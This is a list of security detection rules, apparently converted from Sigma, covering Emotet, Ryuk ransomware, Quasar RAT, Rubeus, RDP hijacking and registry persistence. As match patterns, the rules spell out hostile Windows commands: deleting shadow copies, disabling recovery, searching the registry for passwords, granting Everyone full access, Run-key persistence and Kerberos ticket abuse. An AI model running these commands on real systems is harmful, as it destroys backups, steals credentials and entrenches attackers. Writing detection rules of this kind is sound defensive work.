<li><a href="#">rule public_cyber_enemy_emotet_has_returned { meta: author = "Osman Demir" description = "Detects Emotet License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1193, Initial_Access" events: (($selection.metadata.product_event_type = "1" and ((re.regex($selection.target.process.file.full_path, `.*/powershell\.exe`) and re.regex($selection.target.process.command_line, `powersheLL -e .*[Net\.ServicePointManager]::\\\"SecuRiTYPrOTOcoL\\\" = .*sPlIT\\\"\([char]42\);.*DOWNLoADFIlE\\\".* {\([wmiclass]'win32_Process'\)\.\\\"crEAte\\\".*}}catch{}}.*`)) or (re.regex($selection.src.process.file.full_path, `C:\\Users\\.*\\988\.exe`) and re.regex($selection.target.process.file.full_path, `C:\\Users\\.*\\AppData\\Local\\wmidx\\tsbyuv\.exe`)))) or ($selection.metadata.product_event_type = "13" and re.regex($selection.target.process.file.full_path, `.*\\tsbyuv\.exe`) and $selection.target.registry.registry_key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" and re.regex($selection.target.registry.registry_value_data, `\"C:\\Users\\.*\\AppData\\Local\\wmidx\\tsbyuv\.exe\\\"`)) or ($selection.target.file.md5 = "5d2c6110f2ea87a6b7fe9256affbac0eebdeee18081d59e05df4b4a17417492b" or $selection.target.file.md5 = "4fdff0ebd50d37a32eb5c3a1b2009cb9764e679d8ee95ca7551815b7e8406206" or $selection.target.file.md5 = "bb5602ea74258ccad36d28f6a5315d07fbeb442a02d0c91b39ca6ba0a0fe71a2" or $selection.target.file.md5 = "6d86e68c160b25d25765a4f1a2f8f1f032b2d5cb0d1f39d1d504eeaa69492de0" or $selection.target.file.md5 = "18fab1420a6a968e88909793b3d87af2e8e1e968bf7279d981276a2aa8aa678e" or $selection.target.file.md5 = "d5213404d4cc40494af138f8051b01ec3f1856b72de3e24f75aca8c024783e89")) condition: $selection 
<li><a href="#">rule pulse_secure_attack_cve201911510 { meta: author = "Florian Roth" description = "Detects CVE-2019-11510 exploitation attempt - URI contains Guacamole License: ." reference = "" version = "0.01" created = "2021-03-09" category = "webserver" events: re.regex($selection.target.url, `.*\?/dana/html5acc/guacamole/.*`) condition: $selection 
<li><a href="#">rule quarkspwdump_dump_file { meta: author = "Florian Roth" description = "Detects a dump file written by QuarksPwDump password dumper License: ." reference = "" version = "0.01" created = "2018/02/10" product = "windows" service = "sysmon" mitre = "credential_access, t1003" events: ($selection.metadata.product_event_type = "11" and re.regex($selection.target.file.full_path, `.*\\AppData\\Local\\Temp\\SAM-.*\.dmp.*`)) condition: $selection 
<li><a href="#">rule quasar_rat_detector_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Quasar is an open-source RAT that is readily available on GitHub and has been used by the hackers as far back in October 2015.. License: ." reference = "" version = "0.01" created = "2018/06/01" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "0A4915B81D9A9ACF4E19181DEEEBBE244430C16B" or $selection.target.file.md5 = "323160C88A254127D9ADB2848AE044AFFF376A4D" or $selection.target.file.md5 = "395166835495B418773C9690227779D592F94F71" or $selection.target.file.md5 = "3EE410DD50FC64F39DFF0C4EE8CC676F0F7D5A74" or $selection.target.file.md5 = "5B665152F6596D4412267F9C490878455BA235F9" or $selection.target.file.md5 = "5FE8558EB8A3C244BE2DA8BE750221B9A9EE8539" or $selection.target.file.md5 = "61CB5E535F0AC90A1F904EC9937298F50E2B4974" or $selection.target.file.md5 = "6A1CD05F07B1024287CEA400237E1EA9D2FE1678" or $selection.target.file.md5 = "7676AFF05A3550E5BBFF78CF4D10C9E094447D72" or $selection.target.file.md5 = "86165F464EC1912A43445D80559D65C165E2CF76" or $selection.target.file.md5 = "AB3CD05BE6B0BA8567B84D10EDE28ABF87E115AC" or $selection.target.file.md5 = "BFD7158E1C2F6BA525E24F85ED8CCF8EF40FD370" or $selection.target.file.md5 = "CFEBEFC92DCDF1687FD0BC1B50457EBDEA8672A2" or $selection.target.file.md5 = "D21B8514990B0CEAC5EAE687DEAA60B447139B9D")) condition: $selection 
<li><a href="#">rule query_credentials_in_registry { meta: author = "Emir Erdogan" description = "Query Credentials in Registry License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1214" events: ($selection.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" and $selection.target.process.file.full_path = "C:\\Windows\\System32\\reg.exe" and ($selection.target.process.command_line = "reg query HKCU /f password /t REG_SZ /s" or $selection.target.process.command_line = "reg query HKLM /f password /t REG_SZ /s")) condition: $selection 
<li><a href="#">rule rdp_hijacking_terminal_services__manipulation { meta: author = "Den Iuzvyk" description = "Detects Terminal Services Manipulation. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "atatck.t1112, atatck.defense_evasion" events: ($selection.metadata.product_event_type = "13" and re.regex($selection.target.registry.registry_key, `.*System\\CurrentControlSet\\Services\\TermService\\Parameters\\ServiceDll`)) condition: $selection 
<li><a href="#">rule rdp_login_from_localhost { meta: author = "Thomas Patzke" description = "RDP login with localhost source address may be a tunnelled login License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "Lateral Movement, t1076, Command And Control, t1071, t1043" events: ($selection.metadata.product_event_type = "4624" and $selection.extensions.auth.mechanism = "10" and ($selection.principal.ip = "::1" or $selection.principal.ip = "127.0.0.1")) condition: $selection 
<li><a href="#">rule rdp_over_reverse_ssh_tunnel_wfp { meta: author = "Samir Bousseaden" description = "Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389 License: ." reference = "" version = "0.01" created = "2019/02/16" product = "windows" service = "security" mitre = "defense_evasion, command_and_control, t1076, car.2013-07-002" events: ($selection.metadata.product_event_type = "5156" and (($selection.principal.port = "3389" and (re.regex($selection.target.ip, `127\..*`) or $selection.target.ip = "::1")) or ($selection.target.port = "3389" and (re.regex($selection.principal.ip, `127\..*`) or $selection.principal.ip = "::1")))) condition: $selection 
<li><a href="#">rule registry_explorer_tool_detector { meta: author = "Lee Archinal" description = "The detects Registry Explorer tool RECmd.exe running on a system License: ." reference = "" version = "0.01" created = "2019/05/08" product = "windows" service = "sysmon" mitre = "discovery, t1012" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*\\RECmd\.exe`)) condition: $selection 
<li><a href="#">rule registry_persistence_mechanisms { meta: author = "Karneades" description = "Detects persistence registry keys License: ." reference = "" version = "0.01" created = "2018/04/11" product = "windows" service = "sysmon" mitre = "privilege_escalation, persistence, defense_evasion, t1183, car.2013-01-002" events: ($selection_reg1.metadata.product_event_type = "13" and (re.regex($selection_reg1.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options.*\\GlobalFlag`) or re.regex($selection_reg1.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit.*\\ReportingMode`) or re.regex($selection_reg1.target.registry.registry_key, `.*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit.*\\MonitorProcess`)) and $selection_reg1.metadata.event_type = "SetValue") condition: $selection_reg1 
<li><a href="#">rule registry_persistence_via_explorer_run_key { meta: author = "Florian Roth" description = "Detects a possible persistence mechanism using RUN key for Windows Explorer and poiting to a suspicious folder License: ." reference = "" version = "0.01" created = "2018/07/18" product = "windows" service = "sysmon" mitre = "persistence, t1060, capec.270" events: ($selection.metadata.product_event_type = "13" and re.regex($selection.target.registry.registry_key, `.*\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run`) and (re.regex($selection.metadata.description, `C:\\Windows\\Temp\\.*`) or re.regex($selection.metadata.description, `C:\\ProgramData\\.*`) or re.regex($selection.metadata.description, `.*\\AppData\\.*`) or re.regex($selection.metadata.description, `C:\\$Recycle\.bin\\.*`) or re.regex($selection.metadata.description, `C:\\Temp\\.*`) or re.regex($selection.metadata.description, `C:\\Users\\Public\\.*`) or re.regex($selection.metadata.description, `C:\\Users\\Default\\.*`))) condition: $selection 
<li><a href="#">rule remote_access_to_ssh_ftp_sftp_applications { meta: author = "Osman Demir" description = "Detects unauthorized access License: ." reference = "" version = "0.01" created = "2021-03-09" product = "linux" service = "sshd" mitre = "t1078, persistence, privilege_escalation, initial_access" events: ((($selection.src.application = "ssh" or $selection.src.application = "sftp" or $selection.src.application = "ftp") and ($selection.target.ip = "172.16.0.0/16" or $selection.target.ip = "192.168.0.0/16" or $selection.target.ip = "10.0.0.0/8")) or ((($selection.target.port = "22" or $selection.target.port = "21") and ($selection.target.ip = "172.16.0.0/16" or $selection.target.ip = "192.168.0.0/16" or $selection.target.ip = "10.0.0.0/8")) and not (($selection.principal.ip = "allowed ip address list" or $selection.principal.ip = "172.16.0.0/16" or $selection.principal.ip = "192.168.0.0/16" or $selection.principal.ip = "10.0.0.0/8")))) condition: $selection 
<li><a href="#">rule remote_desktop_from_internet_via_audit { meta: author = "SOC Prime Team" description = "Detects RDP logons from non-private ip ranges. RDP & Local Administrator accounts are often targeted for remote access. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "initial_access, t1076, t1078" events: (($selection1.metadata.product_event_type = "4624" and $selection1.extensions.auth.mechanism = "10") and not ((re.regex($selection1.principal.ip, `10\..*`) or re.regex($selection1.principal.ip, `192\.168\..*`) or re.regex($selection1.principal.ip, `172\.31.*`) or re.regex($selection1.principal.ip, `172\.30\..*`) or re.regex($selection1.principal.ip, `172\.29\..*`) or re.regex($selection1.principal.ip, `172\.28\..*`) or re.regex($selection1.principal.ip, `172\.27\..*`) or re.regex($selection1.principal.ip, `172\.26\..*`) or re.regex($selection1.principal.ip, `172\.25\..*`) or re.regex($selection1.principal.ip, `172\.24\..*`) or re.regex($selection1.principal.ip, `172\.23\..*`) or re.regex($selection1.principal.ip, `172\.21\..*`) or re.regex($selection1.principal.ip, `172\.20\..*`) or re.regex($selection1.principal.ip, `172\.19\..*`) or re.regex($selection1.principal.ip, `172\.18\..*`) or re.regex($selection1.principal.ip, `172\.17\..*`) or re.regex($selection1.principal.ip, `172\.16\..*`) or re.regex($selection1.principal.ip, `fd.*`) or re.regex($selection1.principal.ip, `fc.*`) or re.regex($selection1.principal.ip, `127\.0\.0\.1.*`) or re.regex($selection1.principal.ip, `::1.*`)))) condition: $selection1 
<li><a href="#">rule remote_execution_via_sql_extended_stored_procedure_xp_cmdshell { meta: author = "Den Iuzvyk" description = "Detects remote execution via sql extended stored procedure xp_cmdshell. Check events 15457, 18454, 33205 in MSSQLSERVER log for correlation. License: ." reference = "" version = "0.01" created = "2019/12/18" product = "windows" service = "process_creation" mitre = "defense_evasion, execution, t1218, t1204, t1059" events: ((re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\pwsh\.exe`)) and re.regex($selection.src.process.file.full_path, `.*\\sqlservr\.exe`)) condition: $selection 
<li><a href="#">rule remote_system_discovery__ping_sweep { meta: author = "Ariel Millahuel" description = "This rule detects an attempt to identify remote systems via ping sweep License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "discovery, T1018" events: ($selection1.target.process.file.full_path = "ping.exe" and (re.regex($selection1.target.process.command_line, `.* for /l %i in \(1,1,254\) do ping -n 1 -w 100 192\.168\.1\.%i .*`) or re.regex($selection1.target.process.command_line, `.*for /l %i in \(1,1,254\) do ping -n 1 -w 100 .*\..*\..*\.%i.*`)) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) condition: $selection1 
<li><a href="#">rule renamed_binary { meta: author = "Matthew Green - @mgreen27" description = "Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint. License: ." reference = "" version = "0.01" created = "2019/06/15" category = "process_creation" product = "windows" mitre = "t1036, defense_evasion" events: ((($selection.target.file.full_path = "cmd.exe" or $selection.target.file.full_path = "powershell.exe" or $selection.target.file.full_path = "powershell_ise.exe" or $selection.target.file.full_path = "psexec.exe" or $selection.target.file.full_path = "psexec.c" or $selection.target.file.full_path = "cscript.exe" or $selection.target.file.full_path = "wscript.exe" or $selection.target.file.full_path = "mshta.exe" or $selection.target.file.full_path = "regsvr32.exe" or $selection.target.file.full_path = "wmic.exe" or $selection.target.file.full_path = "certutil.exe" or $selection.target.file.full_path = "rundll32.exe" or $selection.target.file.full_path = "cmstp.exe" or $selection.target.file.full_path = "msiexec.exe" or $selection.target.file.full_path = "7z.exe" or $selection.target.file.full_path = "winrar.exe") and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not ((re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell_ise\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\psexec\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\psexec64\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\cscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\wscript\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\mshta\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\regsvr32\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\wmic\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\certutil\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\rundll32\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\cmstp\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\msiexec\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\7z\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\winrar\.exe`)))) condition: $selection 
<li><a href="#">rule renamed_powershell { meta: author = "Florian Roth" description = "Detects the execution of a renamed PowerShell often used by attackers or malware License: ." reference = "" version = "0.01" created = "2019/08/22" product = "windows" service = "sysmon" mitre = "car.2013-05-009" events: (($selection.metadata.description = "Windows PowerShell" and $selection.metadata.description = "Microsoft Corporation") and not (re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`))) condition: $selection 
<li><a href="#">rule renamed_powershellexe { meta: author = "Tom Ueltschi (@c_APT_ure)" description = "Detects copying and renaming of powershell.exe before execution (RETEFE malware DOC/macro starting Sept 2018) License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "t1086, execution" events: (($selection.metadata.description = "Windows PowerShell" and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not (((re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\powershell_ise\.exe`)) or $selection.metadata.description = "Windows PowerShell ISE"))) condition: $selection 
<li><a href="#">rule renamed_psexec { meta: author = "Florian Roth" description = "Detects the execution of a renamed PsExec often used by attackers or malware License: ." reference = "" version = "0.01" created = "2019/05/21" product = "windows" service = "sysmon" mitre = "car.2013-05-009" events: (($selection.metadata.description = "Execute processes remotely" and $selection.metadata.product_name = "Sysinternals PsExec") and not ((re.regex($selection.target.process.file.full_path, `.*\\PsExec\.exe`) or re.regex($selection.target.process.file.full_path, `.*\\PsExec64\.exe`)))) condition: $selection 
<li><a href="#">rule renamed_zoho_dctask64 { meta: author = "Florian Roth" description = "Detects a renamed dctask64.exe used for process injection, command execution, process creation with a signed binary by ZOHO Corporation License: ." reference = "" version = "0.01" created = "2020/01/28" category = "process_creation" product = "windows" mitre = "defense_evasion, t1055" events: (($selection.target.file.md5 = "6834B1B94E49701D77CCB3C0895E1AFD" and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not (re.regex($selection.target.process.file.full_path, `.*\\dctask64\.exe`))) condition: $selection 
<li><a href="#">rule rid_hijacking { meta: author = "Den Iuzvyk" description = "Detects RID Hijacking License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "t1098, persistence" events: ($selection.metadata.product_event_type = "13" and re.regex($selection.target.registry.registry_key, `.*\\SAM\\SAM\\Domains\\Account\\Users\\000001F5`)) condition: $selection 
<li><a href="#">rule rig_ek_delivers_predator_the_thiefbot_ransomware { meta: author = "Emir Erdogan" description = "Rig EK Delivers Predator the thief&Bot Ransomware License: ." reference = "" version = "0.01" created = "2019/11/24" product = "windows" service = "sysmon" mitre = "T1486, T1059" events: ((((re.regex($selection1.target.process.file.full_path, `.*\\socks111atx\.exe`) and re.regex($selection1.src.process.file.full_path, `.*\\radD8D54\.tmp\.exe`)) or ($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*\\regsvr32\.exe`) and (re.regex($selection1.target.process.command_line, `.*\\D5F4\.tmp\.dll`) or re.regex($selection1.target.process.command_line, `.*\\CD2D\.tmp\.dll`)))) or (re.regex($selection1.target.process.command_line, `.*ping 127\.0\.0\.1 && del.*`) and re.regex($selection1.src.process.file.full_path, `.*\\radD8D54\.tmp\.exe`))) and (re.regex($selection1.target.process.file.full_path, `.*\\notepad\.exe`) and re.regex($selection1.target.process.command_line, `.*\\FILES ENCRYPTED\.txt`))) condition: $selection1 
<li><a href="#">rule roma225_campaign_firewallproxy { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Roma225 Campaign Detector. License: ." reference = "" version = "0.01" created = "2018/12/27" product = "proxy" mitre = "Command and Control, t1071" events: (($SelectionSRC.principal.ip = "138.36.3.228" or $SelectionSRC.principal.ip = "184.75.209.169" or $SelectionSRC.principal.ip = "177.85.98.242") or ($SelectionSRC.target.ip = "138.36.3.228" or $SelectionSRC.target.ip = "184.75.209.169" or $SelectionSRC.target.ip = "177.85.98.242") or ($SelectionSRC.target.url = "" or $SelectionSRC.target.url = "" or $SelectionSRC.target.url = "") or (re.regex($SelectionSRC.target.hostname, `.*office365update\.duckdns\.org.*`) or re.regex($SelectionSRC.target.hostname, `.*systen32\.ddns\.net.*`))) condition: $SelectionSRC 
<li><a href="#">rule roma225_campaign_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Roma225 Campaign Detector. License: ." reference = "" version = "0.01" created = "2018/12/27" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "4211e091dfb33523d675d273bdc109ddecf4ee1c1f5f29e8c82b9d0344dbb6a1" or $selection.target.file.md5 = "e8a765ec824881e1e78defd7c011da735f3e3b954aaf93a4282b6455a1b9afcc" or $selection.target.file.md5 = "702e5cc9462e464c8c29c832fe0d1ecd5cd7740cc2cbceecfd70e566da8194a1")) condition: $selection 
<li><a href="#">rule rottenpotato_like_attack_pattern { meta: author = "@SBousseaden, Florian Roth" description = "Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like License: ." reference = "" version = "0.01" created = "2019/11/15" product = "windows" service = "security" mitre = "privilege_escalation, credential_access, t1171" events: ($selection.metadata.product_event_type = "4624" and $selection.extensions.auth.mechanism = "3" and $selection.target.user.user_display_name = "ANONYMOUS_LOGON" and $selection.principal.hostname = "-" and $selection.principal.ip = "127.0.0.1") condition: $selection 
<li><a href="#">rule rubeus_hack_tool { meta: author = "Florian Roth" description = "Detects command line parameters used by Rubeus hack tool License: ." reference = "" version = "0.01" created = "2018/12/19" category = "process_creation" product = "windows" mitre = "credential_access, t1003, s0005" events: ((re.regex($selection.target.process.command_line, `.* asreproast .*`) or re.regex($selection.target.process.command_line, `.* dump /service:krbtgt .*`) or re.regex($selection.target.process.command_line, `.* kerberoast .*`) or re.regex($selection.target.process.command_line, `.* createnetonly /program:.*`) or re.regex($selection.target.process.command_line, `.* ptt /ticket:.*`) or re.regex($selection.target.process.command_line, `.* /impersonateuser:.*`) or re.regex($selection.target.process.command_line, `.* renew /ticket:.*`) or re.regex($selection.target.process.command_line, `.* asktgt /user:.*`) or re.regex($selection.target.process.command_line, `.* harvest /interval:.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule rubeus_hack_tool_sysmon { meta: author = "Florian Roth, Roman Ranskyi" description = "Detects command line parameters used by Rubeus hack tool License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "t1003, Credential Access, Lateral Movement, t1075, t1097" events: ($selection.metadata.product_event_type = "1" and (re.regex($selection.target.process.command_line, `.* asreproast .*`) or re.regex($selection.target.process.command_line, `.* dump /service:krbtgt .*`) or re.regex($selection.target.process.command_line, `.* kerberoast .*`) or re.regex($selection.target.process.command_line, `.* createnetonly /program:.*`) or re.regex($selection.target.process.command_line, `.* ptt /ticket:.*`) or re.regex($selection.target.process.command_line, `.* /impersonateuser:.*`) or re.regex($selection.target.process.command_line, `.* renew /ticket:.*`) or re.regex($selection.target.process.command_line, `.* asktgt /user:.*`) or re.regex($selection.target.process.command_line, `.* harvest /interval:.*`))) condition: $selection 
<li><a href="#">rule rubeus_hack_tool_windows_security { meta: author = "Florian Roth, Roman Ranskyi" description = "Detects command line parameters used by Rubeus hack tool License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "t1003, Credential Access, Lateral Movement, t1075, t1097" events: ($selection.metadata.product_event_type = "4688" and (re.regex($selection.target.process.command_line, `.* asreproast .*`) or re.regex($selection.target.process.command_line, `.* dump /service:krbtgt .*`) or re.regex($selection.target.process.command_line, `.* kerberoast .*`) or re.regex($selection.target.process.command_line, `.* createnetonly /program:.*`) or re.regex($selection.target.process.command_line, `.* ptt /ticket:.*`) or re.regex($selection.target.process.command_line, `.* /impersonateuser:.*`) or re.regex($selection.target.process.command_line, `.* renew /ticket:.*`) or re.regex($selection.target.process.command_line, `.* asktgt /user:.*`) or re.regex($selection.target.process.command_line, `.* harvest /interval:.*`))) condition: $selection 
<li><a href="#">rule rundll32_internet_connection { meta: author = "Florian Roth" description = "Detects a rundll32 that communicates with public IP addresses License: ." reference = "" version = "0.01" created = "2017/11/04" product = "windows" service = "sysmon" mitre = "t1085, defense_evasion, execution" events: (($selection.metadata.product_event_type = "3" and re.regex($selection.target.process.file.full_path, `.*\\rundll32\.exe`)) and not ((re.regex($selection.target.ip, `10\..*`) or re.regex($selection.target.ip, `192\.168\..*`) or re.regex($selection.target.ip, `172\..*`)))) condition: $selection 
<li><a href="#">rule ryuk_encryption_and_evasion_techniques { meta: author = "Osman Demir" description = "Detects Ryuk Ransomware License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1486, Impact, T1137, Persistence" events: (($selection.metadata.product_event_type = "1" and (re.regex($selection.target.process.command_line, `icacls \"C:.*\" /grant Everyone:F /T /C /Q`) or $selection.target.process.command_line = "\"C:\\Windows\\System32\\net.exe\" stop \"audioendpointbuilder\" /y" or $selection.target.process.command_line = "\"C:\\Windows\\System32\\net.exe\" stop \"samss\" /y")) or ($selection.metadata.product_event_type = "11" and (re.regex($selection.target.file.full_path, `C:\\Users.*\\Pictures.*\.RYK`) or $selection.target.file.full_path = "C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\RyukReadMe.html"))) condition: $selection 
<li><a href="#">rule ryuk_ransomware { meta: author = "Vasiliy Burov" description = "Detects Ryuk Ransomware command lines License: ." reference = "" version = "0.01" created = "2019/08/06" category = "process_creation" product = "windows" events: ((re.regex($selection.target.process.command_line, `.*\\net\.exe stop \"samss\" .*`) or re.regex($selection.target.process.command_line, `.*\\net\.exe stop \"audioendpointbuilder\" .*`) or re.regex($selection.target.process.command_line, `.*\\net\.exe stop \"unistoresvc_\?\?\?\?\?\" .*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule ryuk_ransomware_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This detects charactaristics of the Ryuk Ransomware strain of malware License: ." reference = "" version = "0.01" created = "2019/07/15" product = "windows" service = "sysmon" mitre = "impact, t1486, execution, t1204" events: ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\.ryk`) or $selection1.target.file.full_path = "RyukReadMe.html")) condition: $selection1 
<li><a href="#">rule ryuk_ransomware_hash_detected { meta: author = "Furkan Celik" description = "While most ransomware is spread using spam email and exploit kits, Ryuk is delivered as a payload of the Emotet and Trickbot malware. Looking at the encryption process and ransom demands, Ryuk is targeting big enterprises in the hopes of large payoffs. License: ." reference = "" version = "0.01" created = "2020/03/28" product = "windows" service = "security" mitre = "impact, T1486" events: (($selection.target.file.md5 = "5AC0F050F93F86E69026FAEA1FBB4450" or $selection.target.file.md5 = "6CDCB9F86972EFC4CFCE4B06B6BE053A" or $selection.target.file.md5 = "31BD0F224E7E74EEE2847F43AAE23974") and $selection.metadata.product_event_type = "1") condition: $selection 
<li><a href="#">rule ryuk_ransomware_persistence_mechanism_detection { meta: author = "Furkan Celik" description = "Ryuk adds the following registry key so it will execute at every login. It uses the command below to create a registry key License: ." reference = "" version = "0.01" created = "2020/03/30" product = "windows" service = "security" mitre = "persistence, T1183" events: ($selection.target.process.command_line = "C:\\Windows\\System32\\cmd.exe\" /C REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" or re.regex($selection.target.process.command_line, `/v \"svchos\" /t REG_SZ /d \"C:\\Users\\Public.*\.exe\" /f`)) condition: $selection 
<li><a href="#">rule ryuk_ransomware_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Ryuk Ransomware Detector. License: ." reference = "" version = "0.01" created = "2019/01/03" product = "windows" service = "sysmon" mitre = "Execution, t1204, Defense Evasion, t1112, Impact, t1486" events: ($selection1.metadata.product_event_type = "1" and (($selection1.target.file.md5 = "c0202cf6aeab8437c638533d14563d35" or $selection1.target.file.md5 = "d348f536e214a47655af387408b4fca5" or $selection1.target.file.md5 = "958c594909933d4c82e93c22850194aa" or $selection1.target.file.md5 = "86c314bc2dc37ba84f7364acd5108c2b" or $selection1.target.file.md5 = "29340643ca2e6677c19e1d3bf351d654" or $selection1.target.file.md5 = "cb0c1248d3899358a375888bb4e8f3fe" or $selection1.target.file.md5 = "1354ac0d5be0c8d03f4e3aba78d2223e" or $selection1.target.file.md5 = "5ac0f050f93f86e69026faea1fbb4450" or $selection1.target.file.md5 = "965884f19026913b2c57b8cd4a86455a61383de01dabb69c557f45bb848f6c26" or $selection1.target.file.md5 = "b8fcd4a3902064907fb19e0da3ca7aed72a7e6d1f94d971d1ee7a4d3af6a800d" or $selection1.target.file.md5 = "795db7bdad1befdd3ad942be79715f6b0c5083d859901b81657b590c9628790f") or re.regex($selection1.target.process.command_line, `.*REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"svchos\" /t REG_SZ /d \"C:\\Users\\admin\\AppData\\Local.*`))) condition: $selection1 
<li><a href="#">rule ryuk_sample__sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects characteristics of a recent sample of Ryuk malware License: ." reference = "" version = "0.01" created = "2019/03/16" product = "windows" service = "sysmon" mitre = "Impact, T1490" events: (($selection1.metadata.product_event_type = "1" and (((((($selection1.target.process.file.full_path = "hveffNueElan.exe" or $selection1.target.process.file.full_path = "mBXRPRuhYlan.exe") or ($selection1.target.process.file.full_path = "icacls.exe" and re.regex($selection1.target.process.command_line, `icacls C:.* /grant Everyone:F /T /C /QÃ¾Ã¾`))) or ($selection1.target.process.file.full_path = "cmd.exe" and ($selection1.target.process.command_line = "cmd.exe /c bcdedit /set {default} recoveryenabled No & bcdedit /set {default}" or $selection1.target.process.command_line = "cmd.exe /c WMIC.exe shadowcopy delete" or $selection1.target.process.command_line = "cmd.exe /c vssadmin.exe Delete Shadows /all /quiet" or re.regex($selection1.target.process.command_line, `C:\\Windows\\System32\\cmd\.exe /C REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v EV /t REG_SZ /d .* /f /reg:64`)))) or ($selection1.target.process.file.full_path = "bcdedit.exe" and ($selection1.target.process.command_line = "bcdedit /set {default}" or $selection1.target.process.command_line = "bcdedit /set {default} recoveryenabled No"))) or ($selection1.target.process.file.full_path = "net.exe" and $selection1.target.process.command_line = "C:\\Windows\\System32\\net.exe stop samss /y")) or ($selection1.target.process.file.full_path = "reg.exe" and re.regex($selection1.target.process.command_line, `REG ADD HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v EV /t REG_SZ /d .* /f /reg:64`)))) or ($selection1.metadata.product_event_type = "13" and re.regex($selection1.target.registry.registry_key, `REGISTRY\\USER\\S-1-5-21-638615289-2068236702-2426684043-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EV .*`) and re.regex($selection1.metadata.description, `.*`))) condition: $selection1 
